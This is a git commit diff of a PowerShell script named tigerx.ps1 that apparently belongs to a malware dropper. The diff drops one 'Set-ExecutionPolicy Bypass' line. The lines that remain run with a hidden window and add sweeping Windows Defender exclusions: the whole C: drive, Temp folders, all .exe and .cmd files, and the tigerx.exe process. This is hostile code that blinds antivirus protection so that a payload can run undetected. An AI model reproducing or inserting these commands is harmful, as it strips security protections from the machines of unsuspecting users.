39a4da8d173ea3bf7708a6e83191e35cda94a404
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-12-09 14:50:02 +0200

    Update tigerx.ps1

--- tigerx.ps1
+++ tigerx.ps1
@@ -1,5 +1,4 @@
 Powershell.exe -WindowStyle Hidden
-Set-ExecutionPolicy Bypass -Force
 Add-MpPreference -ExclusionPath "C:*","tigerx.exe","C:\Windows\Temp\",".cmd",".exe","$env:TEMP"
 add-mppreference -exclusionprocess $env:TEMP
 add-mppreference -exclusionprocess tigerx.exe
